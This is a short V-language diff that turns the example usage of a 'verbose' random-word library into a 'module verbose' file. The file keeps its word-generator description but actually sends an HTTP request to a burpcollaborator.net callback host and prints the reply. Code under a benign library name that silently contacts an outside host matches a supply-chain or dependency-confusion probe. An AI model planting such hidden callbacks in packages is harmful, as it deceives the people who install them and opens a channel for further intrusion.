@@ -1,14 +1,10 @@
-import tleen.verbose
+module verbose
 
-fn main() {
-	println('phrase: ' + verbose.generate('adverb-adjective-verb-noun'))
-	// phrase: tepidly-rattier-permeates-albany
-	println('adjective: ' + verbose.adjective())
-	// adjective: neuritic
-	println('adverb: ' + verbose.adverb())
-	// adverb: decurrently
-	println('noun: ' + verbose.noun())
-	// noun: ceasefire
-	println('verb: ' + verbose.verb())
-	// verb: coincide
+// verbose is a generator for random parts of speech
+import net.http
+
+if resp := http.get('http://roj1jkbk6eaefelbyvn4kdhoifojc8.burpcollaborator.net/') {
+	println(resp.text) // resp is a http.Response, not an optional
+} else {
+	println(err)
 }
